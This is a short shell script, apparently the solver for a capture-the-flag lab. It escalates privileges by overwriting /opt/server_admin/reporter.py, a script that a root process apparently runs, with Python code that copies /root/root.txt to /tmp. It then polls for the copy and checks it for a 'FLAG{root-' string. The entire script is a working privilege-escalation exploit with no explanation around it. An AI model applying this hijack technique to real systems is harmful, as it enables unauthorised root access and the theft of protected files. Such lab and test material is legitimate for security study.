set -eu
cat > /opt/server_admin/reporter.py <<'EOF'
open('/tmp/libhijack-root', 'w').write(open('/root/root.txt').read())
EOF
for _ in 1 2 3 4 5 6 7 8 9 10; do
    [ -s /tmp/libhijack-root ] && break
    sleep 1
done
out=$(cat /tmp/libhijack-root 2>/dev/null || true)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "Python library hijack failed" >&2; exit 1; }
